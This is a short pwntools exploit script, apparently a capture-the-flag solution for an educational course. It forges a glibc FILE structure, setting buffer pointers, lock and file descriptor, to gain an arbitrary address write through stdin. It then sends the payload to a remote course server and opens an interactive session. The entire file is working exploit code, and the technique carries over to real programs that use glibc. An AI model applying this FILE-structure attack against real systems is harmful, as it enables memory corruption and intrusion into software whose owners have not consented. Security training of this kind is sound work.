#!/usr/bin/python3

from pwn import *
from sys import argv

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

aaw_owo_addr = 0x404070
lock_addr = 0x4040a0

padding = p64(0) * 3 + p64(0x1e1)

# 從 stdin 讀資料，寫到指定記憶體位址
def aaw():
    f = FileStructure(0)
    f.flags = 0xfbad0000

    f._IO_buf_base = aaw_owo_addr
    f._IO_buf_end = aaw_owo_addr + 0x4
    f._IO_write_base = aaw_owo_addr

    f._IO_read_ptr = 0
    f._IO_read_end = 0
    f._lock = lock_addr
    f.fileno = 0
    return padding + bytes(f)[:-8]

# r = process('./aaw', env={"LD_PRELOAD": "/usr/src/glibc/glibc_dbg/libc.so"}, aslr=False)
r = remote('edu-ctf.zoolab.org', 10009)
payload = aaw()

# gdb.attach(r)
r.send(payload)
sleep(1)
#r.sendline(b'A'*8)
r.interactive()
